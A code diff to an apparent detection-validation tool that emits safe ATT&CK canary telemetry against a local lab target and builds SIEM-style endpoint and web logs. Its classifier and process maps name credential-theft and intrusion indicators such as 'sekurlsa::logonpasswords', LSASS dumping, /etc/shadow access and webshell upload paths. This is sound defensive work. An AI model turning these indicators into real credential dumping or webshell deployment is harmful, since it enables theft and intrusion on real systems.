+        safety_controls=["no network configuration query", "endpoint telemetry fixture only", "fixed discovery commands"],
+        steps=[
+            "POST ipconfig and netsh discovery canaries.",
+            "Record process telemetry with network-configuration indicators.",
+            "Validate network configuration discovery detections.",
+        ],
+        emits_network_traffic=True,
+    ),
+    Simulation(
+        id="sim-t1018-remote-system-discovery",
+        technique_id="T1018",
+        name="Remote system discovery",
+        category="discovery-canary",
+        risk_level=1,
+        target_types=["endpoint", "windows-endpoint"],
+        description="Generate remote-system discovery telemetry without querying a domain or network.",
+        expected_telemetry=["net view", "nltest dclist", "domain discovery", "remote_system_discovery alert"],
+        safety_controls=["no domain query", "no network enumeration", "endpoint telemetry fixture only"],
+        steps=[
+            "POST net view and nltest discovery canaries.",
+            "Record process telemetry with remote-system discovery indicators.",
+            "Validate remote system discovery detections.",
+        ],
+        emits_network_traffic=True,
+    ),
+    Simulation(
+        id="sim-t1518-software-discovery",
+        technique_id="T1518",
+        name="Software discovery",
+        category="discovery-canary",
+        risk_level=1,
+        target_types=["endpoint", "windows-endpoint"],
+        description="Generate installed-software discovery telemetry without querying installed software.",
+        expected_telemetry=["wmic product", "PowerShell registry uninstall path", "software_discovery alert"],
+        safety_controls=["no registry/software query", "endpoint telemetry fixture only", "fixed discovery commands"],
+        steps=[
+            "POST WMIC and PowerShell software-discovery canaries.",
+            "Record process telemetry with software-discovery indicators.",
+            "Validate installed software discovery detections.",
+        ],
+        emits_network_traffic=True,
+    ),
+    Simulation(
         id="sim-t1110-web-login-failures",
         technique_id="T1110",
         name="Web failed-login sequence canary",
@@ -488,6 +1013,42 @@ SIMULATIONS: list[Simulation] = [
     ),
 ]
 
+SIMULATIONS.extend(
+    Simulation(
+        id=atomic_simulation_id(spec),
+        technique_id=spec["technique_id"],
+        name=f"Atomic event: {spec['name']}",
+        category="atomic-event-artifact",
+        risk_level=1,
+        target_types=["endpoint", "windows-endpoint", "linux-endpoint", "identity-lab", "cloud", "email", "proxy"],
+        description=(
+            "Generate one high-fidelity vendor-shaped detection-validation event for this ATT&CK technique. "
+            "This is artifact telemetry only: no exploit, malware, credential access, or OS command is executed."
+        ),
+        expected_telemetry=[
+            f"{spec['event'].get('provider', 'edr')} event",
+            f"event_id={spec['event'].get('event_id', 'ATOMIC')}",
+            f"event_name={spec['event'].get('event_name', 'AtomicArtifact')}",
+            "ATT&CK technique mapped in simulation metadata",
+            "run_id and simulation_id correlation fields",
+        ],
+        safety_controls=[
+            "single event only",
+            "local endpoint telemetry fixture only",
+            "no command execution",
+            "no credential access",
+            "no filesystem, registry, cloud, identity, or network changes",
+        ],
+        steps=[
+            "Create one vendor-shaped atomic telemetry event from the curated catalog.",
+            "Write the event to the endpoint JSONL and normalized endpoint log.",
+            "Validate the SIEM rule trigger using the event fields and ATT&CK mapping.",
+        ],
+        emits_network_traffic=True,
+    )
+    for spec in ATOMIC_EVENT_SPECS
+)
+
 TARGETS: list[Target] = [
     Target(
         id="lab-web-01",
@@ -516,6 +1077,27 @@ TARGETS: list[Target] = [
         allowed_hours="local lab only",
     ),
     Target(
+        id="lab-endpoint-01",
+        name="Docker attack lab endpoint target",
+        address=_ATTACK_LAB_ENDPOINT_URL,
+        target_type="endpoint",
+        environment="lab",
+        owner="endpoint-security",
+        authorization="local-endpoint-telemetry-fixture",
+        allowed_categories=[
+            "credential-dumping-canary",
+            "execution-canary",
+            "transfer-canary",
+            "persistence-canary",
+            "defense-evasion-canary",
+            "discovery-canary",
+            "atomic-event-artifact",
+        ],
+        allowed_simulations=sorted(ENDPOINT_SIMULATION_IDS),
+        rate_limit="predefined endpoint event set only",
+        allowed_hours="local lab only",
+    ),
+    Target(
         id="lab-idp-01",
         name="Approved lab identity target",
         address="https://idp-lab.example.test",
@@ -524,7 +1106,8 @@ TARGETS: list[Target] = [
         owner="identity-security",
         authorization="approved-lab-fixture",
         allowed_categories=["credential-access"],
-        allowed_simulations=["sim-t1110-lab-login-sequence"],
+        allowed_simulations=[],
+        rate_limit="plan-only until an identity lab fixture is deployed",
     ),
     Target(
         id="lab-egress-agent",
@@ -535,7 +1118,8 @@ TARGETS: list[Target] = [
         owner="detection-engineering",
         authorization="approved-lab-fixture",
         allowed_categories=["c2-emulation"],
-        allowed_simulations=["sim-t1071-controlled-beacon"],
+        allowed_simulations=[],
+        rate_limit="plan-only until an egress agent fixture is deployed",
     ),
 ]
 
@@ -619,10 +1203,31 @@ def run_controlled_record(simulation_id: str, target_id: str, analyst_note: str 
         "Record detection result as passed, failed, partial, or not proven.",
     ]
 
+    executed_target_label = ""
     if target["id"] == "lab-web-01" and simulation["id"] in WEB_SIMULATION_IDS:
-        telemetry = run_lab_web_attack(run_id, simulation["id"], analyst_note)
+        telemetry = run_lab_attack_target(
+            run_id,
+            simulation["id"],
+            analyst_note,
+            server_url=ensure_lab_web_target(),
+            target_kind="web",
+        )
+        executed_target_label = "web"
         traffic_emitted = True
         result = "local_lab_web_telemetry_collected"
+        gaps = telemetry.get("validation_gaps", gaps)
+        next_steps = telemetry.get("next_steps", next_steps)
+    elif target["id"] == "lab-endpoint-01" and simulation["id"] in ENDPOINT_SIMULATION_IDS:
+        telemetry = run_lab_attack_target(
+            run_id,
+            simulation["id"],
+            analyst_note,
+            server_url=ensure_lab_endpoint_target(),
+            target_kind="endpoint",
+        )
+        executed_target_label = "endpoint"
+        traffic_emitted = True
+        result = "local_lab_endpoint_telemetry_collected"
         gaps = telemetry.get("validation_gaps", gaps)
         next_steps = telemetry.get("next_steps", next_steps)
 
@@ -631,7 +1236,7 @@ def run_controlled_record(simulation_id: str, target_id: str, analyst_note: str 
         "Verified target allowlist and simulation-category policy.",
         "Generated expected telemetry checklist.",
         (
-            f"Executed predefined local lab web request set against {target['address']}."
+            f"Executed predefined local lab {executed_target_label} request set against {target['address']}."
             if traffic_emitted
             else "No network traffic emitted by this simulation runner."
         ),
@@ -707,8 +1312,8 @@ def _target_dict(item: Target) -> dict:
     }
 
 
-def run_lab_web_attack(run_id: str, simulation_id: str, analyst_note: str = "") -> dict[str, Any]:
-    server_url = ensure_lab_web_target()
+def run_lab_attack_target(run_id: str, simulation_id: str, analyst_note: str = "", server_url: str | None = None, target_kind: str = "web") -> dict[str, Any]:
+    server_url = server_url or ensure_lab_web_target()
     attack_log_file = _attack_log_path(run_id)
     requests_to_send = _web_request_sequence(simulation_id)
     results: list[dict[str, Any]] = []
@@ -737,6 +1342,7 @@ def run_lab_web_attack(run_id: str, simulation_id: str, analyst_note: str = "") 
             item["path"],
             body=item.get("body", ""),
             purpose=item.get("purpose", ""),
+            extra_headers=item.get("headers") or {},
         )
         results.append(event)
         _append_jsonl(attack_log_file, event)
@@ -756,20 +1362,21 @@ def run_lab_web_attack(run_id: str, simulation_id: str, analyst_note: str = "") 
     _append_jsonl(attack_log_file, summary)
 
     return {
-        "server": _lab_web_target_info(server_url),
+        "server": _lab_target_info(server_url, target_kind=target_kind),
         "log_file": str(attack_log_file),
         "web_access_log_file": str(_web_access_log_path()),
         "web_server_access_log_file": str(_web_server_access_log_path()),
         "web_security_log_file": str(_web_security_log_path()),
         "web_error_log_file": str(_web_error_log_path()),
         "web_auth_log_file": str(_web_auth_log_path()),
+        "endpoint_log_file": str(_endpoint_log_path()),
         "cleared_shared_logs": cleared_logs,
         "request_count": len(results),
         "success_count": summary["success_count"],
         "events": results,
         "summary": summary,
         "validation_gaps": [
-            "Telemetry was collected from the built-in local lab web server, not from production WAF or SIEM.",
+            f"Telemetry was collected from the built-in local lab {target_kind} target, not from production telemetry.",
             "Confirm detection coverage by forwarding these logs or reproducing the same safe request set in an authorized detection lab.",
         ],
         "next_steps": [
@@ -801,14 +1408,27 @@ def ensure_lab_web_target() -> str:
     return ensure_lab_web_server()
 
 
-def _lab_web_target_info(server_url: str) -> dict[str, Any]:
+def ensure_lab_endpoint_target() -> str:
+    target_url = os.environ.get("ATTACK_LAB_ENDPOINT_URL", _DEFAULT_ATTACK_LAB_ENDPOINT_URL).rstrip("/")
+    if target_url != _DEFAULT_ATTACK_LAB_ENDPOINT_URL:
+        return target_url
+    return ensure_lab_web_server()
+
+
+def _lab_target_info(server_url: str, target_kind: str = "web") -> dict[str, Any]:
     parsed = parse.urlparse(server_url)
+    docker_target = (
+        server_url != _DEFAULT_ATTACK_LAB_WEB_URL
+        if target_kind == "web"
+        else server_url != _DEFAULT_ATTACK_LAB_ENDPOINT_URL
+    )
     return {
         "url": server_url,
         "host": parsed.hostname or _LAB_WEB_HOST,
         "port": parsed.port or (443 if parsed.scheme == "https" else 80),
         "status": "running",
-        "deployment": "docker_target" if server_url != _DEFAULT_ATTACK_LAB_WEB_URL else "in_process_test_fallback",
+        "target_kind": target_kind,
+        "deployment": "docker_target" if docker_target else "in_process_test_fallback",
     }
 
 
@@ -816,7 +1436,17 @@ def _web_request_sequence(simulation_id: str) -> list[dict[str, Any]]:
     return WEB_SIMULATION_REQUESTS.get(simulation_id, WEB_SIMULATION_REQUESTS["sim-t1595-http-fingerprint"])
 
 
-def _send_lab_web_request(run_id: str, simulation_id: str, index: int, base_url: str, method: str, path: str, body: str = "", purpose: str = "") -> dict[str, Any]:
+def _send_lab_web_request(
+    run_id: str,
+    simulation_id: str,
+    index: int,
+    base_url: str,
+    method: str,
+    path: str,
+    body: str = "",
+    purpose: str = "",
+    extra_headers: dict[str, str] | None = None,
+) -> dict[str, Any]:
     url = f"{base_url}{path}"
     started = time.perf_counter()
     headers = {
@@ -826,9 +1456,10 @@ def _send_lab_web_request(run_id: str, simulation_id: str, index: int, base_url:
         "X-AdversaryGraph-Request-Index": str(index),
         "X-AdversaryGraph-Request-Purpose": purpose,
     }
+    headers.update({str(key): str(value) for key, value in (extra_headers or {}).items()})
     data = body.encode("utf-8") if body else None
     if data is not None:
-        headers["Content-Type"] = "application/json" if body.strip().startswith(("{", "[")) else "application/x-www-form-urlencoded"
+        headers.setdefault("Content-Type", "application/json" if body.strip().startswith(("{", "[")) else "application/x-www-form-urlencoded")
     req = request.Request(url, data=data, method=method, headers=headers)
     try:
         with request.urlopen(req, timeout=5) as response:
@@ -860,7 +1491,7 @@ def _send_lab_web_request(run_id: str, simulation_id: str, index: int, base_url:
         "url": url,
         "path": path,
         "purpose": purpose,
-        "request_headers": headers,
+        "request_headers": _redact_sensitive_headers(headers),
         "request_body_length": len(data or b""),
         "request_body_sha256": hashlib.sha256(data).hexdigest() if data else "",
         "status": status,
@@ -872,11 +1503,27 @@ def _send_lab_web_request(run_id: str, simulation_id: str, index: int, base_url:
     }
 
 
+def _redact_sensitive_headers(headers: dict[str, str]) -> dict[str, str]:
+    redacted: dict[str, str] = {}
+    for key, value in headers.items():
+        if key.lower() in {"authorization", "proxy-authorization", "cookie", "set-cookie"}:
+            redacted[key] = "[redacted]"
+        else:
+            redacted[key] = value
+    return redacted
+
+
 class _TelemetryWebHandler(BaseHTTPRequestHandler):
     server_version = "AdversaryGraphTelemetryWeb/1.0"
 
     def do_HEAD(self) -> None:
         self._handle_request(include_body=False)
+
+    def do_OPTIONS(self) -> None:
+        self._handle_request(include_body=True)
+
+    def do_TRACE(self) -> None:
+        self._handle_request(include_body=True)
 
     def do_GET(self) -> None:
         self._handle_request(include_body=True)
@@ -889,7 +1536,8 @@ class _TelemetryWebHandler(BaseHTTPRequestHandler):
 
     def _handle_request(self, include_body: bool) -> None:
         request_body = self._read_request_body()
-        auth_event = _auth_event_for_request(self.command, self.path, request_body)
+        headers = {key: value for key, value in self.headers.items()}
+        auth_event = _auth_event_for_request(self.command, self.path, request_body, headers)
         body = _response_body_for_path(self.path)
         status = 200 if body is not None else 404
         payload = body if body is not None else b"not found\n"
@@ -911,6 +1559,8 @@ class _TelemetryWebHandler(BaseHTTPRequestHandler):
         if self.command == "POST" or auth_event:
             content_type = "application/json"
         self.send_response(status)
+        if self.command == "OPTIONS":
+            self.send_header("Allow", "GET, HEAD, POST, OPTIONS")
         self.send_header("Content-Type", content_type)
         self.send_header("Content-Length", str(len(payload)))
         self.send_header("X-AdversaryGraph-Lab", "attack-simulation")
@@ -946,10 +1596,10 @@ class _TelemetryWebHandler(BaseHTTPRequestHandler):
             "clean_path": parsed.path,
             "query_keys": sorted(query.keys()),
             "protocol": self.request_version,
-            "headers": headers,
+            "headers": _redact_sensitive_headers(headers),
             "body_length": len(request_body),
             "body_sha256": hashlib.sha256(request_body).hexdigest() if request_body else "",
-            "body_preview": request_body[:160].decode("utf-8", errors="replace") if request_body else "",
+            "body_preview": request_body[:1024].decode("utf-8", errors="replace") if request_body else "",
             "matched_canaries": _classify_web_canaries(self.command, self.path, headers, request_body),
             "status": status,
             "response_bytes": response_bytes,
@@ -973,23 +1623,30 @@ def _response_body_for_path(path: str) -> bytes | None:
         return b"Contact: mailto:security@example.test\nPolicy: https://example.test/security-policy\n"
     if clean_path == "/login":
         return b"login failed\n"
+    if clean_path == "/basic-auth":
+        return b"basic auth required\n"
     if clean_path == "/login/user-check":
         return b'{"status":"recorded","lab":"attack-simulation"}\n'
+    if clean_path == "/internal/activity":
+        return b'{"status":"recorded","lab":"attack-simulation","type":"internal_activity"}\n'
     if clean_path.startswith("/api/"):
         return b'{"status":"ok","lab":"attack-simulation"}\n'
     if clean_path in {"/admin", "/download", "/fetch", "/proxy", "/cgi-bin/status", "/shell.php"}:
         return b"lab canary recorded\n"
     if clean_path.startswith("/downloads/"):
         return b"AG_BENIGN_DOWNLOAD_CANARY\n"
+    if clean_path.startswith("/upload/"):
+        return b"upload canary recorded\n"
     return None
 
 
-def _auth_event_for_request(method: str, path: str, body: bytes) -> dict[str, Any] | None:
+def _auth_event_for_request(method: str, path: str, body: bytes, headers: dict[str, str] | None = None) -> dict[str, Any] | None:
     parsed = parse.urlparse(path)
     clean_path = parsed.path
     query = parse.parse_qs(parsed.query, keep_blank_values=True)
     body_fields = _parse_request_fields(body)
     fields = {**{key: values[-1] if values else "" for key, values in query.items()}, **body_fields}
+    header_lookup = {key.lower(): value for key, value in (headers or {}).items()}
     canary = str(fields.get("ag_canary") or "").lower()
 
     if method == "GET" and clean_path == "/login/user-check":
@@ -1006,6 +1663,23 @@ def _auth_event_for_request(method: str, path: str, body: bytes) -> dict[str, An
             "password_length": 0,
             "password_sha256": "",
             "status": 200 if exists else 404,
+        }
+
+    if method == "GET" and clean_path == "/basic-auth":
+        username, password = _parse_basic_auth_header(str(header_lookup.get("authorization") or ""))
+        exists = username in LAB_AUTH_USERS
+        success = exists and LAB_AUTH_USERS[username] == password
+        return {
+            "event_type": "lab_web_basic_auth",
+            "auth_username": username,
+            "auth_user_hash": _stable_hash(username) if username else "",
+            "auth_user_exists": exists,
+            "auth_outcome": "success" if success else "failure",
+            "auth_failure_reason": "" if success else ("bad_password" if exists else "unknown_user"),
+            "credential_attack_type": "basic_auth_bruteforce",
+            "password_length": len(password),
+            "password_sha256": _stable_hash(password) if password else "",
+            "status": 200 if success else 401,
         }
 
     if method == "POST" and clean_path == "/login":
@@ -1028,6 +1702,17 @@ def _auth_event_for_request(method: str, path: str, body: bytes) -> dict[str, An
         }
 
     return None
+
+
+def _parse_basic_auth_header(header: str) -> tuple[str, str]:
+    if not header.lower().startswith("basic "):
+        return ("", "")
+    try:
+        decoded = base64.b64decode(header.split(" ", 1)[1], validate=True).decode("utf-8", errors="replace")
+    except Exception:
+        return ("", "")
+    username, _, password = decoded.partition(":")
+    return (username, password)
 
 
 def _parse_request_fields(body: bytes) -> dict[str, str]:
@@ -1064,11 +1749,15 @@ def _stable_hash(value: str) -> str:
 
 
 def _classify_web_canaries(method: str, path: str, headers: dict[str, str], body: bytes) -> list[str]:
+    header_lookup = {key.lower(): value for key, value in headers.items()}
+    user_agent = str(header_lookup.get("user-agent") or "").lower()
+    method_override = str(header_lookup.get("x-http-method-override") or "").lower()
     haystack = " ".join(
         [
             method,
             parse.unquote_plus(path),
-            " ".join(f"{key}:{value}" for key, value in headers.items()),
+            user_agent,
+            method_override,
             body.decode("utf-8", errors="replace"),
         ]
     ).lower()
@@ -1088,6 +1777,14 @@ def _classify_web_canaries(method: str, path: str, headers: dict[str, str], body
         "beacon": ["ag_canary=beacon", "/api/ping", "/api/telemetry"],
         "exfil": ["ag_canary=exfil", "ag_exfil_canary", "/api/export", "/collect"],
         "admin_discovery": ["/admin", "/.git/config", "/backup.zip"],
+        "http_method_probe": ["ag_canary=http_method_probe", "options", "trace", "delete"],
+        "not_found_burst": ["ag_canary=not_found_burst", "/wp-admin", "/phpmyadmin", "/server-status", "/actuator/env", "/.svn/entries", "/owa/auth/logon.aspx"],
+        "tool_user_agent": ["ag_canary=tool_user_agent", "curl/", "python-requests", "sqlmap", "nmap scripting engine"],
+        "basic_auth_bruteforce": ["ag_canary=basic_auth_bruteforce", "/basic-auth"],
+        "suspicious_upload": ["ag_canary=suspicious_upload", "/upload/shell.php", "/upload/cmd.aspx", "/upload/agent.jsp"],
+        "shadow_file_access": ['ag_canary":"shadow_file_access', "ag_canary=shadow_file_access", "/etc/shadow"],
+        "mimikatz_lsass": ['ag_canary":"mimikatz_lsass', "mimikatz", "sekurlsa::logonpasswords"],
+        "lsass_dump": ['ag_canary":"lsass_minidump', 'ag_canary":"procdump_lsass', "minidump", "procdump", "lsass.dmp"],
     }
     matches: list[str] = []
     for name, needles in indicators.items():
@@ -1126,6 +1823,14 @@ def _web_auth_log_path() -> Path:
     return _ensure_log_dir() / "lab-web-auth.log"
 
 
+def _endpoint_log_path() -> Path:
+    return _ensure_log_dir() / "lab-endpoint.log"
+
+
+def _endpoint_jsonl_path() -> Path:
+    return _ensure_log_dir() / "lab-endpoint.jsonl"
+
+
 def _shared_lab_web_log_paths() -> list[Path]:
     return [
         _web_access_log_path(),
@@ -1133,6 +1838,8 @@ def _shared_lab_web_log_paths() -> list[Path]:
         _web_security_log_path(),
         _web_error_log_path(),
         _web_auth_log_path(),
+        _endpoint_log_path(),
+        _endpoint_jsonl_path(),
     ]
 
 
@@ -1160,7 +1867,10 @@ def _append_operational_web_logs(event: dict[str, Any]) -> None:
     matches = event.get("matched_canaries") or []
     if matches:
         for category in matches:
-            _append_text_line(_web_security_log_path(), _format_web_security_line(event, str(category)))
+            if str(category) in ENDPOINT_CANARY_CATEGORIES:
+                _append_text_line(_endpoint_log_path(), _format_internal_activity_line(event, str(category)))
+            else:
+                _append_text_line(_web_security_log_path(), _format_web_security_line(event, str(category)))
     if event.get("credential_attack_type") or str(event.get("event_type") or "").startswith("lab_web_auth"):
         _append_text_line(_web_auth_log_path(), _format_web_auth_line(event))
     status = int(event.get("status") or 0)
@@ -1212,6 +1922,104 @@ def _format_web_security_line(event: dict[str, Any], category: str) -> str:
     )
 
 
+def _format_internal_activity_line(event: dict[str, Any], category: str) -> str:
+    body = str(event.get("body_preview") or "")
+    process = _json_field(body, "process") or _process_for_category(category)
+    command = _json_field(body, "command") or " ".join(_json_array_field(body, "args"))
+    file_path = _json_field(body, "file_path") or _file_for_category(category)
+    target_process = _json_field(body, "target_process") or "-"
+    operation = _json_field(body, "operation") or category
+    timestamp = str(event.get("timestamp") or datetime.now(timezone.utc).isoformat())
+    path = str(event.get("path") or "-").replace('"', r'\"')
+    command = command.replace('"', r'\"') or "-"
+    provider, event_id, event_name = _endpoint_provider_fields(category)
+    return (
+        f'{timestamp} attack-simulation-endpoint provider="{provider}" event_id="{event_id}" '
+        f'event_name="{event_name}" event="internal_activity" category="{category}" '
+        f'severity="{_security_severity(category)}" host="attack-lab-web" user="lab-user" '
+        f'process="{process}" command="{command}" file_path="{file_path}" target_process="{target_process}" '
+        f'operation="{operation}" client="{event.get("client_ip") or "-"}" method="{event.get("method") or "-"}" '
+        f'uri="{path}" status={int(event.get("status") or 0)} run_id="{event.get("run_id") or "-"}" '
+        f'simulation_id="{event.get("simulation_id") or "-"}" '
+        f'msg="Matched AdversaryGraph internal activity canary: {category}"'
+    )
+
+
+def _json_field(body: str, field: str) -> str:
+    try:
+        value = json.loads(body).get(field, "")
+    except (json.JSONDecodeError, AttributeError):
+        return ""
+    return str(value) if value is not None and not isinstance(value, list) else ""
+
+
+def _endpoint_provider_fields(category: str) -> tuple[str, str, str]:
+    if category == "shadow_file_access":
+        return ("auditd", "SYSCALL", "FileAccess")
+    if category == "mimikatz_lsass":
+        return ("sysmon", "1", "ProcessCreate")
+    if category == "lsass_dump":
+        return ("sysmon", "10", "ProcessAccess")
+    if category == "run_key_persistence":
+        return ("sysmon", "13", "RegistryValueSet")
+    if category == "file_discovery":
+        return ("edr", "FILE_DISCOVERY", "FileDiscovery")
+    if category in {
+        "powershell_encoded",
+        "cmd_shell",
+        "certutil_transfer",
+        "scheduled_task",
+        "service_creation",
+        "rundll32_proxy",
+        "regsvr32_proxy",
+        "system_discovery",
+        "user_discovery",
+        "process_discovery",
+        "network_config_discovery",
+        "remote_system_discovery",
+        "software_discovery",
+    }:
+        return ("sysmon", "1", "ProcessCreate")
+    return ("edr", "-", "EndpointActivity")
+
+
+def _json_array_field(body: str, field: str) -> list[str]:
+    try:
+        value = json.loads(body).get(field, [])
+    except (json.JSONDecodeError, AttributeError):
+        return []
+    if isinstance(value, list):
+        return [str(item) for item in value]
+    return []
+
+
+def _process_for_category(category: str) -> str:
+    return {
+        "shadow_file_access": "cat",
+        "mimikatz_lsass": "mimikatz.exe",
+        "lsass_dump": "procdump64.exe",
+        "powershell_encoded": "powershell.exe",
+        "cmd_shell": "cmd.exe",
+        "certutil_transfer": "certutil.exe",
+        "run_key_persistence": "reg.exe",
+        "scheduled_task": "schtasks.exe",
+        "service_creation": "sc.exe",
+        "rundll32_proxy": "rundll32.exe",
+        "regsvr32_proxy": "regsvr32.exe",
+        "system_discovery": "systeminfo.exe",
+        "file_discovery": "cmd.exe",
+        "user_discovery": "whoami.exe",
+        "process_discovery": "tasklist.exe",
+        "network_config_discovery": "ipconfig.exe",
+        "remote_system_discovery": "net.exe",
+        "software_discovery": "wmic.exe",
+    }.get(category, "-")
+
+
+def _file_for_category(category: str) -> str:
+    return "/etc/shadow" if category == "shadow_file_access" else "-"
+
+
 def _format_web_error_line(event: dict[str, Any]) -> str:
     timestamp = str(event.get("timestamp") or datetime.now(timezone.utc).isoformat())
     client_ip = str(event.get("client_ip") or "-")
@@ -1257,9 +2065,46 @@ def _security_rule_id(category: str) -> str:
 
 
 def _security_severity(category: str) -> str:
-    if category in {"webshell", "command_injection", "exfil", "secret_exposure", "brute_force", "password_spray"}:
+    if category in {
+        "webshell",
+        "command_injection",
+        "exfil",
+        "secret_exposure",
+        "brute_force",
+        "password_spray",
+        "basic_auth_bruteforce",
+        "suspicious_upload",
+        "shadow_file_access",
+        "mimikatz_lsass",
+        "lsass_dump",
+        "powershell_encoded",
+        "certutil_transfer",
+        "run_key_persistence",
+        "scheduled_task",
+        "service_creation",
+        "rundll32_proxy",
+        "regsvr32_proxy",
+    }:
         return "high"
-    if category in {"sqli", "xss", "ssrf", "path_traversal", "failed_login", "user_enumeration"}:
+    if category in {
+        "sqli",
+        "xss",
+        "ssrf",
+        "path_traversal",
+        "failed_login",
+        "user_enumeration",
+        "http_method_probe",
+        "not_found_burst",
+        "tool_user_agent",
+        "cmd_shell",
+        "system_discovery",
+        "file_discovery",
+        "user_discovery",
+        "process_discovery",
+        "network_config_discovery",
+        "remote_system_discovery",
+        "software_discovery",
+    }:
         return "medium"
     return "low"
 
@@ -1276,29 +2121,39 @@ def tail_telemetry_logs(source: str = "web", run_id: str = "", limit: int = 100)
     limit = max(1, min(limit, 500))
     if source not in LOG_SOURCES:
         raise ValueError("Unknown telemetry log source")
-    if source == "run":
+    if source == "attacked_server":
+        path = _ensure_log_dir()
+        events = _tail_attacked_server_logs(limit=limit, run_id=run_id)
+        exists = path.exists()
+    elif source == "run":
         if not _RUN_ID_RE.match(run_id):
             raise ValueError("A valid run_id is required for run telemetry logs")
         path = _attack_log_path(run_id)
         events = _tail_jsonl(path, limit=limit, run_id="")
+        exists = path.exists()
     elif source == "web":
         path = _web_access_log_path()
         events = _tail_jsonl(path, limit=limit, run_id=run_id)
+        for event in events:
+            event.setdefault("source", "web")
+        exists = path.exists()
     else:
         paths = {
             "access": _web_server_access_log_path(),
             "security": _web_security_log_path(),
             "error": _web_error_log_path(),
             "auth": _web_auth_log_path(),
+            "endpoint": _endpoint_log_path(),
         }
         path = paths[source]
         events = _tail_text_log(path, source=source, limit=limit, run_id=run_id)
+        exists = path.exists()
 
     return {
         "source": source,
         "run_id": run_id,
         "log_file": str(path),
-        "exists": path.exists(),
+        "exists": exists,
         "line_count": len(events),
         "events": events,
         "returned_at": datetime.now(timezone.utc).isoformat(),
@@ -1678,6 +2533,31 @@ def _tail_text_log(path: Path, source: str, limit: int, run_id: str = "") -> lis
             if len(events) > limit:
                 events = events[-limit:]
     return events
+
+
+def _tail_attacked_server_logs(limit: int, run_id: str = "") -> list[dict[str, Any]]:
+    sources = [
+        ("access", _web_server_access_log_path()),
+        ("auth", _web_auth_log_path()),
+        ("security", _web_security_log_path()),
+        ("error", _web_error_log_path()),
+        ("endpoint", _endpoint_log_path()),
+    ]
+    events: list[dict[str, Any]] = []
+    for source, path in sources:
+        events.extend(_tail_text_log(path, source=source, limit=limit, run_id=run_id))
+    web_events = _tail_jsonl(_web_access_log_path(), limit=limit, run_id=run_id)
+    for event in web_events:
+        event.setdefault("source", "web")
+        event.setdefault("event_type", "lab_web_access")
+        event.setdefault("message", _siem_event_message(event))
+        events.append(event)
+    events.sort(key=_event_sort_key)
+    return events[-limit:]
+
+
+def _event_sort_key(event: dict[str, Any]) -> tuple[str, int]:
+    return (str(event.get("timestamp") or ""), int(event.get("line_number") or event.get("request_index") or 0))
 
 
 def _text_log_event(source: str, raw: str, line_number: int) -> dict[str, Any]:
